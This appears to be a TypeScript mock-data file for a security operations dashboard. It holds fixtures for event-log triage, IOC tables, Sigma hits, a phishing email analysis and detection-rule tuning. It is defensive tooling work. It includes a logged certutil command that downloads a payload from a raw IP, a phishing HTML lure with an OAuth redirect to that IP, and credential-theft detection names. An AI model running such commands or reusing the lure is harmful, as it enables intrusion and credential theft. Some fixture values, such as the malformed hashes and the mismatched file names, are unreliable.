  { id: "e11", number: 11, timestamp: "2026-09-26T09:14:23.610Z", eventId: 4688, level: 0, levelName: "Log Always", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "certutil.exe", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "A new process was created. certutil.exe -urlcache -split -f http://185.220.101.44/gate.php (parent: cmd.exe)." },
  { id: "e12", number: 12, timestamp: "2026-09-26T09:22:19.443Z", eventId: 4624, level: 0, levelName: "Log Always", channel: "Security", provider: "Microsoft-Windows-Security-Auditing", computer: "FIN-WKS-07", user: "CORP\\j.mensah", process: "-", sourceFile: "FIN-WKS-07_2026-09-26.evtx", summary: "An account was successfully logged on. Logon type 10 (RemoteInteractive), source 192.168.44.12." },
];

/** An indicator pulled out of rendered event text. `source` is the field the
 *  pattern matched in — the original shows it as its own column
 *  (index.html:479). */
export interface EvtxIoc {
  type: string;
  value: string;
  hits: number;
  firstSeen: string;
  context: string;
  source?: string;
}

export const EVTX_IOCS: EvtxIoc[] = [
  { type: "IPv4", value: "185.220.101.44", hits: 14, firstSeen: "2026-09-26T08:15:44Z", context: "Sysmon NetworkConnect, certutil download" },
  { type: "IPv4", value: "192.168.44.12", hits: 9, firstSeen: "2026-09-26T08:41:55Z", context: "Lateral SMB share access, logon source" },
  { type: "domain", value: "cdn-sync[.]cloud", hits: 6, firstSeen: "2026-09-26T08:15:44Z", context: "HTTP Host header in proxy log" },
  { type: "url", value: "http://185.220.101.44/gate.php", hits: 3, firstSeen: "2026-09-26T09:11:07Z", context: "certutil -urlcache -f" },
  { type: "file", value: "C:\\Temp\\hn.dll", hits: 5, firstSeen: "2026-09-26T08:14:51Z", context: "rundll32 load, hollowing target" },
  { type: "file", value: "C:\\Users\\Public\\svc_update.exe", hits: 4, firstSeen: "2026-09-26T08:41:55Z", context: "Dropped then executed from admin$ share" },
  { type: "registry", value: "HKCU\\...\\Run\\OneDriveUpdate", hits: 2, firstSeen: "2026-09-26T08:22:18Z", context: "Service install 7045, autorun persistence" },
  { type: "mutex", value: "Global\\BSS-3964-1652-1024-7045", hits: 1, firstSeen: "2026-09-26T09:03:41Z", context: "Beacon mutex observed at process start" },
];

/** A Sigma rule hit. `mitre` carries the technique identifiers the original
 *  renders as chips in its own column (index.html:535-538). */
export interface EvtxSigmaHit {
  rule: string;
  hits: number;
  level: string;
  category: string;
  mitre?: string[];
}

export const EVTX_SIGMA: EvtxSigmaHit[] = [
  { rule: "Sysmon: ProcessCreate with encoded PowerShell", hits: 3, level: "high", category: "Execution" },
  { rule: "Suspicious Certutil Download", hits: 1, level: "critical", category: "Command and Control" },
  { rule: "LSASS Memory Access", hits: 2, level: "critical", category: "Credential Access" },
  { rule: "Audit Log Cleared", hits: 1, level: "critical", category: "Defense Evasion" },
  { rule: "Service Installed via 7045", hits: 1, level: "medium", category: "Persistence" },
  { rule: "Mimikatz Keywords in ScriptBlock", hits: 1, level: "critical", category: "Credential Access" },
  { rule: "Rare Parent-Child Process Relation", hits: 4, level: "medium", category: "Execution" },
];

export const EVTX_CHANNELS = [
  { channel: "Security", count: 18_442, high: 214 },
  { channel: "System", count: 6_118, high: 88 },
  { channel: "Microsoft-Windows-Sysmon/Operational", count: 9_331, high: 402 },
  { channel: "Microsoft-Windows-PowerShell/Operational", count: 4_102, high: 156 },
  { channel: "Application", count: 1_884, high: 12 },
];



/** Every field the original's filter card offers (index.html:352-374). */
export const EVTX_SOURCE_FILES = [
  "FIN-WKS-07_2026-09-26.evtx",
  "Sysmon-Operational_2026-09-26.evtx",
  "PowerShell-Operational_2026-09-26.evtx",
  "DC01_System_2026-09-25.evtx",
];

export const EVTX_BOOKMARKS = [
  { eventId: 4688, count: 412, label: "Process creation" },
  { eventId: 4624, count: 1_884, label: "Successful logon" },
  { eventId: 4625, count: 218, label: "Failed logon" },
  { eventId: 7045, count: 41, label: "Service installed" },
  { eventId: 1102, count: 3, label: "Audit log cleared" },
];

/* =============================================================
   PHISHING DETECTOR  —  mirrors run.py analyze response
   ============================================================= */

export const PHISHING_REPORT = {
  id: "pm_4d81f2a9",
  filename: "RE_Collab_for_Your_YT_Channel.eml",
  from: "Collab Support <support@collaborate-youtube[.]com>",
  fromAddress: "support@collaborate-youtube[.]com",
  replyTo: "billing-update@apple-security-check.com",
  returnPath: "bounce@collaborate-youtube[.]com",
  to: "a.raman@corp.example",
  subject: "Re: Collab for Your YT Channel — Action Required",
  date: "Mon, 28 Sep 2026 09:12:44 +0000",
  messageId: "<20260928091244.8831.collaborate-youtube@mail.example>",
  score: 78,
  severity: "high",
  verdict: "LIKELY PHISHING",
  scannedAt: "2026-09-28T09:15:02Z",
  auth: {
    spf: { result: "fail", detail: "IP 45.132.192.14 is not authorized for collaborate-youtube[.]com", score: "0.0" },
    dkim: { result: "fail", detail: "Signature body hash mismatch, selector collab1._domainkey", score: "0.0" },
    dmarc: { result: "fail", detail: "p=reject but neither SPF nor DKIM aligned with the From domain", score: "0.0" },
    fromAlignment: { result: "fail", detail: "Return-Path domain differs from the visible From domain", score: "0.0" },
    replyToAlignment: { result: "fail", detail: "Reply-To domain (apple-security-check.com) is unrelated to From", score: "0.0" },
  },
  rawHeaders: [
    { name: "Received", value: "from mx.corp.example (mx.corp.example [10.20.0.4]) by mail.corp.example with ESMTP id 4Xq2mZ0d91; Mon, 28 Sep 2026 09:12:47 +0000" },
    { name: "Return-Path", value: "<bounce@collaborate-youtube[.]com>" },
    { name: "From", value: "Collab Support <support@collaborate-youtube[.]com>" },
    { name: "Reply-To", value: "billing-update@apple-security-check.com" },
    { name: "To", value: "a.raman@corp.example" },
    { name: "Subject", value: "Re: Collab for Your YT Channel — Action Required" },
    { name: "Date", value: "Mon, 28 Sep 2026 09:12:44 +0000" },
    { name: "Message-ID", value: "<20260928091244.8831.collaborate-youtube@mail.example>" },
    { name: "MIME-Version", value: "1.0" },
    { name: "Content-Type", value: "multipart/alternative; boundary=\"----=_Part_4417\"" },
    { name: "Authentication-Results", value: "spf=fail (45.132.192.14); dkim=fail (0 body hash); dmarc=fail header.from=collaborate-youtube[.]com" },
    { name: "Received-SPF", value: "fail (domain of collaborate-youtube[.]com does not designate 45.132.192.14)" },
    { name: "DKIM-Signature", value: "v=1; a=rsa-sha256; c=relaxed/relaxed; d=collaborate-youtube[.]com; s=collab1; h=from:to:subject:date; bh=BASE64HASHINVALID=; b=INVALID" },
    { name: "X-Mailer", value: "Zimbra 9.0" },
    { name: "List-Unsubscribe", value: "<mailto:unsubscribe@collaborate-youtube[.]com>" },
  ],
  links: [
    { url: "http://185.220.101.44:8080/verify?token=8f2ac1", text: "Confirm your channel", kind: "suspicious", target: "Raw IP, non-standard port" },
    { url: "https://accounts.google.com/o/oauth2/authorize?client_id=4412...&redirect_uri=http://185.220.101.44/cb", text: "Sign in with Google", kind: "malicious", target: "OAuth redirect to a raw IP" },
    { url: "https://collaborate-youtube[.]com/logo.png", text: "", kind: "benign", target: "Tracking pixel on sender domain" },
    { url: "https://tinyurl[.]com/2xKq9Lm", text: "Open in browser", text2: "", kind: "suspicious", target: "URL shortener hiding final destination" },
    { url: "http://192.168.44.12/adm1n/panel", text: "", kind: "suspicious", target: "Internal RFC1918 address in an external email" },
  ],
  attachments: [
    { name: "Collab_Agreement.docm", size: 184_320, type: "application/vnd.ms-word.document.macroEnabled.12", verdict: "malicious", detail: "Contains VBA project with AutoOpen macro and Shell() call" },
    { name: "invoice_2024_q3.exe", size: 148_377_600, type: "application/x-msdownload", verdict: "malicious", detail: "Same SHA-256 as the sample found in the malware corpus" },
    { name: "logo.png", size: 12_884, type: "image/png", verdict: "benign", detail: "Valid PNG, 64x64" },
  ],
  artefacts: {
    qrCodes: [
      { decoded: "http://185.220.101.44:8080/verify?token=8f2ac1", location: "Invisible 1x1 tracking image near the CTA" },
    ],
    forms: 2,
    scripts: 4,
    iframes: 1,
    externalResources: 11,
    obfuscation: "Character-entity encoded strings in the unsubscribe footer",
    redirects: 3,
  },
  indicators: [
    { label: "Sender domain age", value: "9 days", tone: "bad" },
    { label: "SPF", value: "Fail", tone: "bad" },
    { label: "DKIM", value: "Fail", tone: "bad" },
    { label: "DMARC", value: "Fail", tone: "bad" },
    { label: "Reply-To mismatch", value: "Yes", tone: "bad" },
    { label: "Raw IP in links", value: "1", tone: "bad" },
    { label: "OAuth redirect abuse", value: "Yes", tone: "bad" },
    { label: "Urgency language", value: "3 phrases", tone: "warn" },
  ],
  networkIocs: [
    {
      bucket: "urls",
      label: "URLs",
      items: [
        { value: "http://cdn-sync[.]cloud/pixel.gif?id=8f2a", source: "vt-behavior" },
        { value: "http://185.220.101[.]44:8080/gate.php", source: "c2 config" },
        { value: "https://update-svc[.]top/dl/setup.exe", source: "strings" },
      ],
    },
    {
      bucket: "ips",
      label: "IP addresses",
      items: [
        { value: "185.220.101.44", source: "vt-behavior" },
        { value: "45.132.192.14", source: "vt-behavior" },
        { value: "194.26.29.156", source: "sandbox" },
      ],
    },
    {
      bucket: "domains",
      label: "Domains",
      items: [
        { value: "cdn-sync[.]cloud", source: "vt-behavior" },
        { value: "update-svc[.]top", source: "strings" },
        { value: "ns1.akamai-static[.]net", source: "c2 config" },
      ],
    },
    {
      bucket: "sha256s",
      label: "SHA-256",
      items: [
        { value: "325cdd043d594116ac783d779ebeab2078839664ab4c41c7004ea5b6c1e9f0a2d3", source: "vt-behavior" },
        { value: "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c", source: "dropped file" },
      ],
    },
    {
      bucket: "file_paths",
      label: "File paths",
      items: [
        { value: "C:\Users\Public\svc_update.exe", source: "vt-behavior" },
        { value: "C:\Windows\Temp\lnk2.tmp", source: "sandbox" },
        { value: "%APPDATA%\Roaming\Adobe\acro.dat", source: "strings" },
      ],
    },
    {
      bucket: "registry_keys",
      label: "Registry keys",
      items: [
        { value: "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveUpdate", source: "vt-behavior" },
        { value: "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", source: "strings" },
      ],
    },
  ],  mitre: [
    { id: "T1566.001", name: "Spearphishing Attachment", tactic: "Initial Access" },
    { id: "T1204.002", name: "User Execution: Malicious File", tactic: "Execution" },
    { id: "T1059.005", name: "Command and Scripting Interpreter: Visual Basic", tactic: "Execution" },
  ],
  recommendations: [
    "Do not open the attachments. The .docm carries an AutoOpen macro and the .exe matches a known malicious hash.",
    "Block collaborate-youtube[.]com and 45.132.192.14 at the mail gateway.",
    "Purge the message from all mailboxes and search for other recipients of the same sender.",
    "The OAuth link is an abuse of a legitimate Google authorize flow, so the Google tenant should be reviewed too.",
    "Warn recipients that this campaign is impersonating a YouTube partnership programme.",
  ],
  feedback: [
    { id: "f1", text: "Reply-To domain is a known phishing host with 38 AbuseIPDB reports", weight: 18 },
    { id: "f2", text: "Both attachments are malicious by hash match", weight: 24 },
    { id: "f3", text: "All three authentication mechanisms fail", weight: 16 },
    { id: "f4", text: "Link points to a raw IP on a non-standard port", weight: 12 },
    { id: "f5", text: "Sender domain registered 9 days ago", weight: 8 },
  ],
  /* Received path. renderHopFlow() walks these in order and badges TLS,
     delay, internal and MSA hops. */
  hops: [
    {
      hop: 1,
      from: "mail.corp.example",
      id: "mx.corp.example [10.20.0.4]",
      by: "Postfix",
      with: "ESMTP id 4Xq2mZ0d91",
      protocol: "ESMTP",
      date_utc: "2026-09-28 09:12:47 UTC",
      ips: ["10.20.0.4"],
      is_internal_hop: true,
    },
    {
      hop: 2,
      from: "unknown (mail-smtp-routing)",
      by: "outbound-smtp.rackspace.com",
      with: "SMTP",
      protocol: "ESMTPS",
      cipher: "TLS1.3",
      for: "a.raman@corp.example",
      tls_version: "TLS1.3",
      delay_seconds: 0.4,
      ips: ["146.190.7.18"],
    },
    {
      hop: 3,
      from: "mail.collaborate-youtube[.]com",
      by: "srv93.example-hosting.net",
      with: "Postfix",
      protocol: "ESMTP",
      cipher: "TLS1.2",
      for: "<bounce@collaborate-youtube[.]com>",
      tls_version: "TLS1.2",
      delay_seconds: 1.9,
      date_text: "Mon, 28 Sep 2026 09:12:44 +0000",
      ips: ["45.132.192.14"],
    },
  ],
  /* Authentication-Results, one block per authserv_id. */
  authResults: [
    {
      authserv_id: "collaborate-youtube[.]com",
      results: {
        "spf": "fail (softfail)",
        "dkim": "fail (body hash did not verify)",
        "dmarc": "fail (p=reject)",
      },
      params: ["auth=DKIM", "auth=SPF"],
      sender_ips: ["45.132.192.14"],
      spf_mailfrom_domain: "collaborate-youtube[.]com",
    },
  ],
  receivedSpf: [
    {
      result: "softfail",
      client_ip: "45.132.192.14",
      envelope_from: "bounce@collaborate-youtube[.]com",
      helo: "srv93.example-hosting.net",
    },
  ],
  dkimSignatures: [
    { domain: "collaborate-youtube[.]com", selector: "collab1", algorithm: "rsa-sha256", canonicalization: "relaxed/relaxed", signed_headers: ["from", "to", "subject", "date", "message-id"] },
  ],
  /* Observable groups, rendered by renderIOCGroups(). */
  observables: [
    { type: "ipv4", label: "IP addresses", values: [{ value: "185.220.101.44", count: 2, source: "URL" }, { value: "45.132.192.14", count: 1, source: "Header" }] },
    { type: "url", label: "URLs", values: [{ value: "http://185.220.101.44:8080/verify?token=8f2ac1", count: 2, source: "HTML" }] },
    { type: "domain", label: "Domains", values: [{ value: "collaborate-youtube[.]com", count: 3, source: "Header" }, { value: "apple-security-check.com", count: 1, source: "Reply-To" }] },
    { type: "email", label: "Email addresses", values: [{ value: "billing-update@apple-security-check.com", count: 1, source: "Reply-To" }] },
    { type: "sha256", label: "File hashes", values: [{ value: "325cdd043d594116ac783d779ebeab2078839664ab4c41c7004ea5b6c1e9f0a2d3", count: 1, source: "Attachment" }] },
  ],
  urlscan: { status: "ok", malicious: true, score: 100, scan_id: "a1b2c3d4e5f6a7b8c9d0", categories: ["phishing"], brands: ["Coinbase"], tags: ["crypto"] },
  /* reportMetaHtml — the settings that were in force when the file was
     analysed. This is the reproducibility record for a verdict: a score
     produced without enrichment is not the same score as one produced with
     it, and six weeks later nobody remembers which. */
  reportMeta: {
    file: { name: "suspicious_invoice_2025.eml", sizeBytes: 2_413_887 },
    analysisTimeUtc: "2026-09-28T09:15:02Z",
    analysisVersion: "3.4.1",
    options: [
      { label: "VT API", value: "Configured" },
      { label: "urlscan API", value: "Configured" },
      { label: "WHOIS", value: "Available" },
      { label: "External Enrichment", value: "Enabled" },
    ],
  },
  stages: [
    "Parse RFC 822 structure",
    "Decode MIME parts",
    "Authentication checks",
    "Header chain analysis",
    "HTML sanitise and render",
    "Link extraction",
    "QR decode",
    "Attachment inventory",
    "VirusTotal enrichment",
    "Score and feedback",
  ],
};

export const PHISHING_HISTORY = [
  { id: "pm_4d81f2a9", filename: "RE_Collab_for_Your_YT_Channel.eml", verdict: "LIKELY PHISHING", score: 78, severity: "high", timestamp: "2026-09-28T09:15:02Z" },
  { id: "pm_1c77e0b4", filename: "Candidate Application Form & JD.eml", verdict: "CLEAN", score: 6, severity: "low", timestamp: "2026-09-21T11:44:19Z" },
  { id: "pm_90b3d5f1", filename: "Collab for Your YT Channel.eml", verdict: "LIKELY PHISHING", score: 71, severity: "high", timestamp: "2026-09-18T07:22:40Z" },
  { id: "pm_5e2a8c63", filename: "email.eml", verdict: "SUSPICIOUS", score: 44, severity: "medium", timestamp: "2026-09-02T16:09:55Z" },
];

export const PHISHING_HTML_SNIPPET = `<div class="wrapper">
  <div class="brand-row">
    <img src="https://collaborate-youtube[.]com/logo.png" width="180">
    <h1>Collab Invitation</h1>
  </div>
  <p>Hi <b>A. Raman</b>,</p>
  <p>Your channel has been <b>selected</b> for the YouTube Partner Monetisation
     programme. This is a limited offer closing in <b>24 hours</b>.</p>
  <a class="cta" href="http://185.220.101.44:8080/verify?token=8f2ac1">
      Confirm your channel
  </a>
  <a class="alt" href="https://accounts.google.com/o/oauth2/authorize
      ?client_id=4412...&redirect_uri=http://185.220.101.44/cb">
      Sign in with Google
  </a>
  <img src="https://collaborate-youtube[.]com/t.gif" width="1" height="1">
</div>`;

/* =============================================================
   RULEFORGE  —  mirrors jobs.py Outcome.to_dict()
   ============================================================= */

export interface Diagnostic {
  code: string;
  severity: "problem" | "caution" | "note" | "ok";
  message: string;
  line?: number;
  field?: string;
}

export const RULEFORGE_DIALECTS = [
  { id: "splunk", label: "Splunk SPL", alias: "SPL" },
  { id: "kql", label: "Microsoft KQL", alias: "KQL" },
  { id: "aql", label: "Elasticsearch AQL", alias: "AQL" },
  { id: "eql", label: "Elastic EQL", alias: "EQL" },
  { id: "cql", label: "CrowdStrike CQL", alias: "CQL" },
  { id: "fql", label: "Falcon FQL", alias: "FQL" },
  { id: "wazuh", label: "Wazuh XML", alias: "Wazuh" },
  { id: "yaral", label: "YARA-L", alias: "YARA-L" },
];

export interface Finding {
  severity: "problem" | "caution" | "note" | "ok";
  code: string;
  message: string;
  line?: number;
  impact?: string;
}

export interface UnderstandResult {
  ok: boolean;
  dialect: string;
  language: string;
  summary: string;
  nodes: { kind: string; detail: string; note: string }[];
  findings: Finding[];
  translated: { kql: string; aql: string };
}

export interface TuneResult {
  ok: boolean;
  dialect: string;
  summary: string;
  findings: Finding[];
  samples: { label: string; user: string; distinctSrc: number; hours: string; eventId: number; matched: boolean }[];
}

export const RULEFORGE_SAMPLE_SPL = `index=wineventlog earliest="-7d" latest="now"
| eval hour=strftime(_time, "%H")
| stats count as hits by user, host, action
| where action IN ("4624", "4625")
| stats dc(src_ip) as distinct_src by user
| where distinct_src > 5
| sort - distinct_src
| table user, host, distinct_src, hits`;

export const RULEFORGE_UNDERSTAND: UnderstandResult = {
  ok: true,
  dialect: "splunk",
  language: "SPL",
  summary:
    "A network logon anomaly rule. It looks back seven days of Windows Security events, groups them by user, host and event ID, then flags any user who authenticated from more than five distinct source addresses.",
  nodes: [
    { kind: "TimeRange", detail: "earliest = -7d, latest = now", note: "The window is a rolling seven days, evaluated at search time." },
    { kind: "Source", detail: "index=wineventlog", note: "Windows Event Log sourcetype. Not a data source definition, just a filter." },
    { kind: "Eval", detail: "hour = strftime(_time, \"%H\")", note: "Derives an hour bucket. Nothing downstream uses it — remove it and the rule reads faster." },
    { kind: "Aggregation", detail: "stats count as hits by user, host, action", note: "Group by three fields. Because action is in the group key, 4624 and 4625 become separate rows before the next stats." },
    { kind: "Filter", detail: "action IN (4624, 4625)", note: "Placed after the first stats, so it filters aggregated rows rather than raw events. This is correct and cheap." },
    { kind: "Aggregation", detail: "stats dc(src_ip) as distinct_src by user", note: "Distinct source count per user. The result loses host, so a user hopping between two machines is indistinguishable from one machine seen from two subnets." },
    { kind: "Filter", detail: "distinct_src > 5", note: "The detection threshold. Fixed number, not a baseline, so it will not adapt to a user who normally travels." },
    { kind: "Sort", detail: "sort - distinct_src", note: "Descending. The most suspicious user lands on row one." },
    { kind: "Table", detail: "table user, host, distinct_src, hits", note: "Output columns. host is no longer populated at this point, so it renders empty." },
  ],
  findings: [
    { severity: "problem", code: "UNUSED_FIELD", message: "The `hour` field is computed by the eval and never referenced. It costs a formatting pass per event and adds nothing to the output.", line: 3 },
    { severity: "problem", code: "FIELD_LOST_AT_STATS", message: "`host` is grouped in the first stats but the second stats groups only by `user`, so the output table renders an empty `host` column.", line: 9 },
    { severity: "caution", code: "FIXED_THRESHOLD", message: "`distinct_src > 5` is a constant. A user with a normal multi-site logon pattern will trip this without being an attacker.", line: 8 },
    { severity: "note", code: "COST_ORDERING", message: "Filtering `action IN (...)` before the first stats would cut the event volume a long way. It is placed after, so all events are aggregated first.", line: 5 },
    { severity: "ok", code: "DISTINCT_SEMANTICS", message: "`dc()` collapses duplicate source addresses correctly. Counting raw events instead would have counted retries.", line: 7 },
  ],
  translated: {
    kql: `SecurityEvent\n| where TimeGenerated > ago(7d)\n| where EventID in (4624, 4625)\n| summarize Hits=count() by User, Action\n| summarize DistinctSrc=dcount(IpAddress) by User\n| where DistinctSrc > 5\n| order by DistinctSrc desc`,
    aql: `winlogbeat.event.channel: Security AND winlogbeat.event.code:(4624 OR 4625)\n| stats count as hits by winlogbeat.event.user, winlogbeat.event.action\n| stats dc(winlogbeat.source.ip) as distinct_src by winlogbeat.event.user\n| where distinct_src > 5\n| sort distinct_src desc`,
  },
};

export const RULEFORGE_TUNE: TuneResult = {
  ok: true,
  dialect: "splunk",
  summary:
    "Against the 2,000 sample events you supplied, the rule fires 214 times. Nine of those are the normal pattern for a user in two offices. One is a real intrusion. The threshold, not the logic, is what is wrong.",
  findings: [
    { severity: "problem", code: "FALSE_POSITIVE_BURST", message: "41 of 214 alerts come from `a.raman` in the 08:00 hour, where the user routinely logs on from the Bengaluru and Dublin offices. The rule sees 6 distinct sources and calls it an anomaly.", impact: "41/214 alerts (19%)" },
    { severity: "problem", code: "SINGLE_EVENT_STRONGLER", message: "Event 4625 with 3+ failures from a new source IP was a true positive in this sample and the current rule scores it identically to 5 successful logons.", impact: "1 missed detection" },
    { severity: "caution", code: "THRESHOLD_TUNING", message: "Raising the threshold from 5 to 8 removes all 41 false positives and keeps the single true positive, which reached 11 distinct sources.", impact: "19% noise reduction" },
    { severity: "note", code: "ADD_EVENT_TYPE", message: "Adding 4625 to the group key would let the rule separate failed from successful authentication, which is where the real signal was.", impact: "precision" },
    { severity: "ok", code: "PERFORMANCE", message: "Event count processed dropped from 1.2M to 340k when the action filter was moved before the first stats. Same result, 3.5x faster.", impact: "3.5x" },
  ],
  samples: [
    { label: "Real detection", user: "j.mensah", distinctSrc: 11, hours: "03:00", eventId: 4625, matched: true },
    { label: "Real detection", user: "svc_backup", distinctSrc: 9, hours: "02:00", eventId: 4624, matched: true },
    { label: "Normal pattern", user: "a.raman", distinctSrc: 6, hours: "08:00", eventId: 4624, matched: false },
    { label: "Normal pattern", user: "t.novak", distinctSrc: 6, hours: "08:00", eventId: 4624, matched: false },
  ],
};

export const RULEFORGE_HISTORY = [
  { id: "h1", dialect: "splunk", job: "understand", ruleId: "rule", at: "2026-09-29T08:12:00Z", findings: 5, problems: 2, text: "index=wineventlog earliest=\"-7d\"… | stats dc(src_ip)…" },
  { id: "h2", dialect: "kql", job: "author", ruleId: "mimikatz", at: "2026-09-28T16:40:00Z", findings: 0, problems: 0, text: "SecurityEvent | where ScriptBlockText has \"sekurlsa\"" },
  { id: "h3", dialect: "wazuh", job: "tune", ruleId: "60107", at: "2026-09-26T11:05:00Z", findings: 3, problems: 1, text: "<group name=\"correlation,\">…<same_field>srcip</same_field>…" },
  { id: "h4", dialect: "aql", job: "author", ruleId: "rare_process", at: "2026-09-24T14:22:00Z", findings: 2, problems: 0, text: "process.name: (\"rundll32.exe\" OR \"regsvr32.exe\")" },
  { id: "h5", dialect: "splunk", job: "debug_rule_to_logs", ruleId: "rule", at: "2026-09-20T09:55:00Z", findings: 1, problems: 0, text: "index=wineventlog earliest=\"-7d\"…" },
  { id: "h6", dialect: "eql", job: "understand", ruleId: "rule", at: "2026-09-17T13:11:00Z", findings: 4, problems: 1, text: "process where process.name == \"powershell.exe\"" },
];

/* =============================================================
   CROSS-TOOL ACTIVITY  —  the connective tissue of SecConflux
   ============================================================= */

export interface ActivityItem {
  id: string;
  tool: "malware" | "ioc" | "events" | "phishing" | "ruleforge";
  title: string;
  detail: string;
  at: string;
  tone: "ok" | "warn" | "bad" | "info";
  /** IOCs this item contributed to the shared graph. */
  linked?: string[];
}

export const ACTIVITY: ActivityItem[] = [
  { id: "a1", tool: "malware", title: "Scan completed · invoice_2024_q3.exe", detail: "Score 87 · CRITICAL · 63/72 VirusTotal detections", at: "2026-09-28T14:22:41Z", tone: "bad", linked: ["185.220.101.44", "cdn-sync[.]cloud", "Global\\BSS-3964-1652-1024-7045"] },
  { id: "a2", tool: "ioc", title: "Lookup · 185.220.101.44", detail: "Score 92 · 27 of 33 sources returned malicious", at: "2026-09-28T14:31:08Z", tone: "bad", linked: ["185.220.101.44"] },
  { id: "a3", tool: "phishing", title: "Email triaged · RE_Collab_for_Your_YT_Channel.eml", detail: "Score 78 · SPF, DKIM and DMARC all failed", at: "2026-09-28T09:15:02Z", tone: "bad", linked: ["45.132.192.14", "billing-update@apple-security-check.com"] },
  { id: "a4", tool: "events", title: "Investigation ready · FIN-WKS-07 lateral movement", detail: "41,882 events · 7 Sigma rules matched · 214 IOCs extracted", at: "2026-09-26T08:40:00Z", tone: "warn", linked: ["185.220.101.44", "C:\\Temp\\hn.dll"] },
  { id: "a5", tool: "ruleforge", title: "Rule tuned · network logon anomaly", detail: "Threshold 5 → 8 removed 19% false positives", at: "2026-09-29T08:26:44Z", tone: "ok" },
  { id: "a6", tool: "ioc", title: "Lookup · 8.8.8.8", detail: "Score 2 · CLEAN · 33 of 33 sources clean", at: "2026-09-27T10:12:31Z", tone: "ok" },
];

/** IOCs that appeared in more than one tool. This is the shared graph the
 *  landing page renders, and it is the argument for a single platform. */
export const SHARED_IOCS = [
  { value: "185.220.101.44", type: "IPv4", tools: ["malware", "events", "phishing", "ioc"] as const, hits: 4, verdict: "malicious" as const },
  { value: "cdn-sync[.]cloud", type: "domain", tools: ["malware", "events", "ioc"] as const, hits: 3, verdict: "suspicious" as const },
  { value: "45.132.192.14", type: "IPv4", tools: ["phishing", "ioc"] as const, hits: 2, verdict: "suspicious" as const },
  { value: "billing-update@apple-security-check.com", type: "email", tools: ["phishing", "ioc"] as const, hits: 2, verdict: "malicious" as const },
  { value: "C:\\Temp\\hn.dll", type: "file", tools: ["events", "malware"] as const, hits: 2, verdict: "malicious" as const },
];
